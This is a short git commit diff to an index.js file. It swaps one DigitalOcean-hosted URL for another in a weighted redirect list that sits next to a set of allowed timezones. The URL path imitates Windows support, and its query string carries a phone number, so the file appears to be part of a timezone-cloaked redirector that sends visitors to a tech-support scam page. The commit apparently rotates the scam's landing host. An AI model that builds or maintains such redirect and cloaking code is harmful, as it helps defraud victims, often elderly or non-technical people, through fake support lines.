7bd4223313135f9081c0d6c5b31ed327a8c8fda8
paalakash <palaksh452@gmail.com>
2026-06-23 07:17:20 +0530

    Update RAW_CONFIGS URLs in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://king-prawn-app-oq8da.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5330", weight: 1.0 }
+    { url: "https://seashell-app-n5lpy.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5330", weight: 1.0 }
 
 ];
 
